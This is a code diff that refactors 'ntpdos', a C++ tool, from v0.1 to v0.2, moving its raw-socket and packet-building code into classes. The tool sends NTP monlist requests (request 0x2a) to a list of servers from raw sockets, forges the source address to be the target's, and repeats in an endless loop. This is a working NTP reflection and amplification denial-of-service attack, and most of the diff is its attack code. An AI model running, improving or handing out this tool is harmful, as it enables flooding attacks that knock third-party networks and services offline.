@@ -32,13 +32,12 @@
 #include <unistd.h>
 #include <vector>
 
-#define VERSION "v0.1"
+#define VERSION "v0.2"
 #define ERR(str) std::cerr << "[-] ERROR: " << str << '\n'
 
 #define NTP_PORT 123
-#define PKT_LEN 104
 
-struct ntp_req_t {
+struct ntphdr {
   unsigned char rm_vn_mode;     /* response, more, version, mode */
   unsigned char auth_seq;       /* key, sequence number */
   unsigned char implementation; /* implementation number */
@@ -51,77 +50,88 @@ struct ntp_req_t {
   char mac[8];                  /* (optional) 8 byte auth code */
 };
 
-struct SOCK {
-  int fd;
-  sockaddr_in dst;
-};
-
-unsigned short csum(unsigned short *addr, int len) {
-  unsigned long sum;
-  for (sum = 0; len > 0; len--)
-    sum += *addr++;
-  sum = (sum >> 16) + (sum & 0xffff);
-  sum += (sum >> 16);
-  return static_cast<unsigned short>(~sum);
-}
-
-void build_pkt(char *pkt, const char *src, const char *dst) {
+class Packet {
+  char pkt[sizeof(iphdr) + sizeof(udphdr) + sizeof(ntphdr)]{};
   iphdr *ip{reinterpret_cast<iphdr *>(pkt)};
   udphdr *udp{reinterpret_cast<udphdr *>(pkt + sizeof(iphdr))};
-  ntp_req_t *ntp{
-      reinterpret_cast<ntp_req_t *>(pkt + sizeof(iphdr) + sizeof(udphdr))};
-  ip->version = 4;
-  ip->ihl = 5;
-  ip->tos = 0;
-  ip->tot_len = PKT_LEN;
-  ip->id = htons(rand());
-  ip->frag_off = 0;
-  ip->ttl = 255;
-  ip->protocol = IPPROTO_UDP;
-  ip->check = 0;
-  ip->saddr = inet_addr(src);
-  ip->daddr = inet_addr(dst);
+  ntphdr *ntp{reinterpret_cast<ntphdr *>(pkt + sizeof(iphdr) + sizeof(udphdr))};
 
-  udp->source = htons(rand());
-  udp->dest = htons(NTP_PORT);
-  udp->len = htons(sizeof(udphdr) + sizeof(ntp_req_t));
-  udp->check = 0;
+public:
+  Packet() = default;
+  Packet(std::string src, std::string dst) {
+    ip->version = 4;
+    ip->ihl = 5;
+    ip->tos = 0;
+    ip->tot_len = size();
+    ip->id = htons(rand());
+    ip->frag_off = 0;
+    ip->ttl = 255;
+    ip->protocol = IPPROTO_UDP;
+    ip->check = 0;
+    ip->saddr = inet_addr(src.c_str());
+    ip->daddr = inet_addr(dst.c_str());
 
-  ip->check = csum(reinterpret_cast<unsigned short *>(pkt), PKT_LEN);
+    udp->source = htons(rand());
+    udp->dest = htons(NTP_PORT);
+    udp->len = htons(sizeof(udphdr) + sizeof(ntphdr));
+    udp->check = 0;
 
-  ntp->rm_vn_mode = 0x27;
-  ntp->implementation = 0x03;
-  ntp->request = 0x2a;
-}
+    ip->check = csum(reinterpret_cast<unsigned short *>(pkt), size());
 
-SOCK make_socket(const char *dst) {
-  SOCK sock;
-  int on = 1;
-  sock.dst.sin_family = AF_INET;
-  sock.dst.sin_port = htons(NTP_PORT);
-  sock.dst.sin_addr.s_addr = inet_addr(dst);
-
-  if ((sock.fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
-    perror("[-] Error ");
-    exit(EXIT_FAILURE);
+    ntp->rm_vn_mode = 0x27;
+    ntp->implementation = 0x03;
+    ntp->request = 0x2a;
   }
 
-  if (setsockopt(sock.fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
-    perror("[-] Error ");
-    exit(EXIT_FAILURE);
+  std::size_t size() { return sizeof(pkt); }
+  char *data() { return pkt; }
+
+  ~Packet() = default;
+
+private:
+  unsigned short csum(unsigned short *addr, int len) {
+    unsigned long sum;
+    for (sum = 0; len > 0; len--)
+      sum += *addr++;
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return static_cast<unsigned short>(~sum);
+  }
+};
+
+class Socket {
+  int fd{}, on{1};
+  sockaddr_in dst{};
+
+public:
+  Socket() = default;
+  Socket(std::string dest) {
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(NTP_PORT);
+    dst.sin_addr.s_addr = inet_addr(dest.c_str());
+
+    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
+      perror("[-] Error ");
+      exit(EXIT_FAILURE);
+    }
+
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
+      perror("[-] Error ");
+      exit(EXIT_FAILURE);
+    }
   }
 
-  return sock;
-}
-
-void send(SOCK *sock, char *pkt) {
-  if (sendto(sock->fd, pkt, PKT_LEN, 0,
-             reinterpret_cast<sockaddr *>(&sock->dst), sizeof(sock->dst)) < 0) {
-    perror("[-] Error ");
-    close(sock->fd);
-    exit(EXIT_FAILURE);
+  void send(Packet &pkt) {
+    if (sendto(fd, pkt.data(), pkt.size(), 0,
+               reinterpret_cast<sockaddr *>(&dst), sizeof(dst)) < 0) {
+      perror("[-] Error ");
+      close(fd);
+      exit(EXIT_FAILURE);
+    }
   }
-}
+
+  ~Socket() = default;
+};
 
 void version() { std::cout << "ntpdos " << VERSION << '\n'; }
 
@@ -173,17 +183,16 @@ void load_file(std::string filename, std::vector<std::string> &vec) {
 void attack(const std::vector<std::string> targets,
             const std::vector<std::string> servers, int delay) {
 
-  std::vector<SOCK> sockets{};
+  std::vector<Socket> sockets{};
 
   for (auto &server : servers)
-    sockets.push_back(make_socket(server.c_str()));
+    sockets.push_back(Socket{server});
 
   while (true) {
     for (auto &target : targets) {
       for (std::size_t i = 0; i < servers.size(); ++i) {
-        char pkt[PKT_LEN]{};
-        build_pkt(pkt, target.c_str(), servers[i].c_str());
-        send(&sockets[i], pkt);
+        Packet pkt{target, servers[i]};
+        sockets[i].send(pkt);
       }
     }
     usleep(delay);
